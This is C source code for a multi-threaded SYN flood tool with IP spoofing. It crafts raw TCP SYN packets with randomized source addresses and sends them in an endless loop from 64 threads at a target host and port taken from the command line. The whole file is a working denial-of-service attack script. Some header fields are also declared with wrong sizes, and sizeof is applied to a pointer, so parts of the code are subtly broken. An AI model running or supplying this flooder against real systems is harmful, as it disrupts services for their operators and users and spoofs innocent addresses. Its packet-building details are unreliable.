/********************************************/
/* Multi-threaded SYN flooder + IP spoofer. */
/* Compile with -lpthread                   */
/********************************************/

#define _GNU_SOURCE // in some cases this is required for pthread to work correctly

#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>

// Thread safe way to increment a value, im leaving the WIN32 version commented out because
// im using POSIX only calls anyways. Later i might make it WIN32 compatible.
/* #ifdef _WIN32 */
/* #define SYNC_ADD_AND_FETCH(x) InterlockedIncrement(&(x)) */
/* #else */
#define SYNC_ADD_AND_FETCH(x) __sync_add_and_fetch(&(x), 1)
/* #endif */

#define MAXTHREADS 64
#define VERBOSE

int socketfd;             // socket file descriptor
static int alive = -1;    // state of the program, all threads die if set to 0

char target_ip[20] = {0}; // our target
int target_port;          // target port

int64_t count = 0;            // Amount of syn packets sent

// https://cdn.kastatic.org/ka-perseus-images/337190cba133e19ee9d8b5878453f915971a59cd.svg
typedef struct ip_t {
    uint8_t  header_len;     // header length
    uint8_t  tos;            // type of service
    uint16_t total_len;      // total length, including data (tcpheader)
    uint16_t id;             // identification
    uint16_t frag_and_flags; // flags and fragmentation offset
    uint8_t  ttl;            // time to live
    uint8_t  transport;      // sets the protocol or transport layer
    uint16_t checksum;       // crc16 checksum of the ip header
    int16_t  sourceIP;       // source ip, we will randomize this
    int16_t  destIP;         // destination ip and in our case target ip
} ip;

// https://networklessons.com/cisco/ccie-routing-switching-written/tcp-header
typedef struct tcphdr_t {
    uint16_t sport;  // source port
    uint16_t dport;  // destination port
    int16_t  seq;    // sequence number
    int16_t  ack;    // acknowledgment number
    uint8_t  lenres; // Data offset field also known as header length
    uint8_t  flag;   // flags. We will set the SYN flag
    uint16_t win;    // Window, this specifies how many bytes we are willing to recieve
    uint16_t sum;    // checksum
    uint16_t urp;    // urgent pointer, we won't use this
} tcphdr;

// pseudo header to make checksum of tcp header work
typedef struct pseudohdr_t {
    int16_t  saddr;
    int16_t  daddr;
    uint8_t  zero;
    uint8_t  protocol;
    uint16_t length;
} pseudohdr;

// performs a crc-16 checksum on a provided buffer
uint16_t crc16_checksum(uint16_t *buffer, uint16_t size) {
    uint64_t cksum = 0;

    // perform sum operation on buffer
    // iterate through the buffer, decreasing size by 2 each time
    while (size>1) {
        cksum += *buffer++;
        size  -= sizeof(uint16_t);
    }

    // if size != 0, there is still a uint8_t unaccounted for
    if (size) {
        cksum += *(uint8_t *)buffer;
    }

    // perform crc operations
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);

    return (uint16_t )(~cksum);
}

// initializes header structures
void initialize_headers(ip *ip, tcphdr *tcp, pseudohdr *pseudoheader) {
    int len = sizeof(ip) + sizeof(tcphdr);                // The total length
    ip->header_len = (4<<4 | sizeof(ip)/sizeof(int16_t)); // 64 bits | however many words the ip header takes up
    ip->tos = 0;                                          // We can just set the type of service to 0
    ip->total_len = htons(len);                           // We have to use htons due to endianness
    ip->id = 1;                                           // identification can just be 1
    ip->frag_and_flags = 0x40;                            // 0100_0000 in binary, sets only the DF flag for Don't Fragment
    ip->ttl = 255;                                        // Maximize time to live
    ip->transport = IPPROTO_TCP;                          // set the transport layer
    ip->checksum = 0;                                     // clear checksum for now, this will be set after random source ip
    ip->sourceIP = 0;                                     // randomized at send
    ip->destIP = inet_addr(target_ip);                    // formats target ip. For example 255.000.000.255 -> 255.0.0.255

    tcp->sport = htons( rand()%16383 + 49152 ); // generates random source port
    tcp->dport = htons(target_port);            // sets destination
    tcp->seq = htonl( rand()%90000000 + 2345 ); // generates random sequence number
    tcp->ack = 0;                               // Acknowledgment number can be 0, as we wont get past the first SYN
    tcp->lenres = (sizeof(tcphdr)/4<<4);        // We wont really be sending data, so this is just a believable number
    tcp->flag = 0x02;                           // Here we set the SYN flag
    tcp->win = htons(2048);                     // Allow recieving 2048 bits of data, we wont recieve them though
    tcp->sum = 0;                               // checksum clear for now
    tcp->urp = 0;                               // urgent pointer N/A

    // Here we set the psuedo header, seems pretty self-explanatory to me
    pseudoheader->zero = 0;
    pseudoheader->protocol = IPPROTO_TCP;
    pseudoheader->length = htons(sizeof(tcphdr));
    pseudoheader->daddr = inet_addr(target_ip);
    srand((unsigned) time(NULL)); // (re)seed random number generator
}

void *flood(void *addr) {
    uint8_t buf[100], sendbuf[100]; // buf is used for calculating checksums and sendbuf is sent to the socketfd
    int len;

    // Our 3 datastructures
    ip ip;
    tcphdr tcp;
    pseudohdr pseudoheader;

    // the same length calculation as in initialize_headers
    len = sizeof(ip) + sizeof(tcphdr);

    // run initialize_headers, this will also seed our random number gen
    initialize_headers(&ip, &tcp, &pseudoheader);

    while(alive) {
        ip.sourceIP = rand(); // randomize source ip

        bzero(buf, sizeof(buf));                                  // clear buffer
        memcpy(buf , &ip, sizeof(ip));                            // copy ip structure over to buffer
        ip.checksum = crc16_checksum((uint16_t*)buf, sizeof(ip)); // perform checksum for ip structure with buffer

        pseudoheader.saddr = ip.sourceIP;

        // perform checksum of pseudoheader + tcpheader
        bzero(buf, sizeof(buf));
        memcpy(buf , &pseudoheader, sizeof(pseudoheader));
        memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(tcphdr));
        tcp.sum = crc16_checksum((uint16_t *) buf, sizeof(pseudoheader)+sizeof(tcphdr));

        // Copy our ip+tcp over to sendbuf in order
        bzero(sendbuf, sizeof(sendbuf));
        memcpy(sendbuf, &ip, sizeof(ip));
        memcpy(sendbuf+sizeof(ip), &tcp, sizeof(tcphdr));
        SYNC_ADD_AND_FETCH(count);
        printf("\033[2J\033[1;1H"); // clear the terminal
        printf("Packets sent: %ld\n", count);
        if (sendto(socketfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr)) < 0) {
            perror("FATAL: Could not send packet");
            pthread_exit("fail");
        }
    }
}

// stops execution at any interrupt signal
void sig_int(int signo) {
    alive = 0;
    perror("Recieved interrupt! Exiting.\n");
}

int main(int argc, char *argv[]) {
    struct sockaddr_in addr;
    struct hostent *host = NULL;

    int on = 1;
    int i = 0;
    pthread_t pthread[MAXTHREADS];

    alive = 1;
    signal(SIGINT, sig_int);

    if(argc < 3) {
        printf("usage: %s <IPaddress> <Port>\n", argv[0]);
        exit(1);
    }

    strncpy(target_ip, argv[1], 16); // set the target ip equal to the first argument
    target_port = atoi(argv[2]);     // set target port equal to the second argument

    bzero(&addr, sizeof(addr));         // clears sockaddr
    addr.sin_family = AF_INET;          // setting connection details
    addr.sin_port = htons(target_port); // setting target port

    // checking if its an ip address
    if(inet_addr(target_ip) == INADDR_NONE) {
        // if target ip is not an ip address, try it as a hostname
        host = gethostbyname(argv[1]);
        if(host == NULL) {
            perror("gethostbyname()");
            exit(1);
        }
        // set ip addr of sockaddr
        addr.sin_addr = *((struct in_addr*)(host->h_addr));
        // set target ip equal to a valid ip address
        strncpy( target_ip, inet_ntoa(addr.sin_addr), 16 );
    }
    else
        addr.sin_addr.s_addr = inet_addr(target_ip); // validate ip address

    // checks if target port is between port range
    if( target_port < 0 || target_port > 65535 ) {
        printf("Port Error\n");
        exit(1);
    }

    printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

    // open a socket
    socketfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socketfd < 0) {
        perror("socket()");
        exit(1);
    }

    // set socket to be raw ip
    if (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, (uint8_t *)&on, sizeof (on)) < 0) {
        perror("setsockopt()\n");
        exit(1);
    }

    // setuid can still fail, even if UID is 0
    if (setuid(getpid()) != 0) {
        perror("setuid()");
        exit(1);
    }

    // create all threads
    for(i=0; i<MAXTHREADS; i++) {
        if (pthread_create(&pthread[i], NULL, flood, &addr) != 0) {
            perror("pthread_create()\n");
            exit(1);
        }
    }

    // join all threads
    for(i=0; i<MAXTHREADS; i++) {
        if(pthread_join(pthread[i], NULL) != 0) {
            perror("pthread_join()\n");
            exit(1);
        }
    }

    close(socketfd);
    return 0;
}
